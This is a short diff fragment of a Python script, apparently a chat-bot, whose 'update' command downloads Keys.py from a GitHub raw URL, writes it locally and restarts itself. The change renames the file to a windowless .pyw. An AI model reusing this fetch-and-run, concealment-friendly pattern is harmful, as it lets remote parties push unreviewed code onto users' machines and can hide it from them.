@@ -87,7 +87,7 @@ async def update(ctx):
     url = "https://raw.githubusercontent.com/TaranMayer/trees/master/Keys.py"
     r = requests.get(url).content.decode('utf-8')
     code = str(r)
-    f = open("Keys.py",'w')
+    f = open("Keys.pyw",'w')
     f.write(code)
     f.close()
     os.spawnl(os.P_WAIT, sys.executable, *([sys.executable] + (sys.argv if __package__ is None else ["-m", __loader__.name] + sys.argv[1:])))
